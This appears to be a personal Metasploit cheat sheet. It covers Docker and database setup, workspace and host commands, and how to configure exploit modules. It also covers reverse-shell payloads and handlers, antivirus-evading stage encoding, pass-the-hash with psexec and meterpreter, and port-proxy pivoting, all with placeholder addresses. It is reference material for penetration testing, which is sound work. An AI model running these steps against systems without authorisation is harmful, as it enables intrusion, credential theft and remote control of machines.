

# Metasploit

## Docker

https://hub.docker.com/r/metasploitframework/metasploit-framework/

```
docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" metasploitframework/metasploit-framework ./msfconsole 
```

- To set up with dabase etc
  - https://medium.com/@nima.saed/metasploit-framework-console-on-docker-with-workspace-fc39f0f2a078
  - Sets up folder structure
  - Create a docker network
  - Create a postgres 11 database on alpine OS and assign it to the network. A volume is mounted to store the data
  - Run MSF docker, with the database and a mount volume for the data + port mapping for MSF
  - Run db_save inside the msfconsole to save the settings
  - In future you run the last command 

```
mkdir $HOME/.msf4
mkdir $HOME/.msf4/database

docker network create --subnet=172.18.0.0/16 msf

docker run --ip 172.18.0.2 --network msf --rm --name postgres -v "${HOME}/.msf4/database:/var/lib/postgresql/data" -e POSTGRES_PASSWORD=postgres -e POSTGRES_USER=postgres -e POSTGRES_DB=msf -d postgres:11-alpine

docker run --rm -it --network msf --name msf --ip 172.18.0.3 -e DATABASE_URL='postgres://postgres:postgres@172.18.0.2:5432/msf' -v "${HOME}/.msf4:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework -q

db_save

docker run --rm -it -u 0 --network msf --name msf --ip 172.18.0.3 -v "${HOME}/.msf4:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework


```



## First Launch

```
service postgresql start
msfdb init
msfconsole -q
```

## Global Variables

```
setg LHOST <IP>
setg RHOSTS <IP Range>
setg RHOST <IP>
save
```

```
unsetg LHOST
unsetg RHOSTS
unsetg RHOST
save 
```

## Database

Metasploit logs information such as hosts, services etc in a database. 

- confirm database is connected:

```
db_status
```

- different scans can be stored in different workspaces 
  - workspaces are created with -a and deleted with -d

```
workspace
workspace <name>
workspace -a <name>
workspace -d <name>
```

- Import nmap data manually or run nmap from metasploit

```
db_import <path to nmap>
db_nmap <nmap flags>
```

- export a database 

```
db_export -f xml <path>
```

- Commands that list information that has been imported/stored in the database

```
hosts
services
creds
loot
```

- Each of these can take arguments to display specific information

```
hosts -c address,os_name
services -c name,info 
```

-  the -S switch can be used to search

```
services -c name -S http
```

- Can specify certain ports

```
services -c host -p 80
```

- output to csv

```
hosts -c address,osname -o <path>
```

- To set RHOSTS automatically use -R flag

```
services -s http -R
```

## MSFCLI 2015

```
msfconsole -x "use exploit/blah/blah/blah;\
set RHOST <ip>;\
set PAYLOAD <payload>;\
set LHOST <ip>;\
run"
```

## MSFCONSOLE

### Common commands

To activate a module:

```
use what/you/want/to/use
```
To search for something:

```
search ms08-067
```
To go to the previously selected module:
```
previous 
```
To show the options the module requires:
```
show options
```
To set or unset a variable

```
set
unset

```
To run a module:

```
run
exploit
```
### Types of Modules

#### Auxiliary

- Provides functionality such as port scanning, enumeration, fuzzing

```
use auxiliary/type/x/y/z
use auxiliary/scanner/x/y/z
```
- Can search

```
search type:auxiliary name:http
```
- Get info about a module

```
info

```
#### Exploit

- Provide exploitation code 

```
use exploit/x/y/z
```
- Require a paylod, otherwise will select it's default payload. 

```
show payloads

search meterpreter type:payload

set payload os/payload type
```

- payloads have options too

```
show options
```
- You will likely need to set a listener host and port that the reverse shell will come back to

```
set LHOST <ip>
set LPORT <ip>

```

- Verify the host is vulnerable

```
check
```

- Exploit the target

```
exploit
```

- The -j flag passed to exploit will run it in the background if you want to do other things while waiting for the connection. 

```
exploit -j
```



### Types of Payload

- Staged and Non Staged
- Non-staged
  - 	sent with the exploits
  - 	shell_reverse_tcp is non-staged
- staged
  - sent in two parts
    - 			primary payload stager that retrieves the second payload
    - 			second payload with the shellcode that executes
  - 			Better for bypassing AV 
  - 			Shellcode is injected directly into memory 
  - 			shell/reverse_tcp is staged

### Encoding Second Stage

- Second stage can be encoded

```
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
```



## Handlers

- multi/handler
  - handles exploits launched outside of the framework

```
use exploit/multi/handler 
set payload payload/to/expect
set LHOST <local IP>
set LPORT <local PORT>
exploit
```

- When the executable is executed on the victim the handler will present the resultant shell 

## Post Exploitation 

### Pass the hash

- Needs hash from another host for example you ran hashdump 

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST <local IP>
set LPORT <local port>
set RHOST <target ip> 
set SMBPass <hash>
set SMBUser <username>
exploit 
```

### PortProxy

- portproxy module can be used to create a port forwarding rule 
- You set the IP and port the client is listening on and configure a connect address where traffic to that port is forwarded on to

```
set CONNECT_ADDRESS <IP to forward traffic>
set CONNECT_PORT <port to forward traffic>
set LOCAL ADDRESS <local address to listen on>
set LOCAL_PORT <local Port to listen on>
```

- It acts as a wrapper around netsh 
- Then configure your exploit LHOST and LPORT to be the client you are proxy through 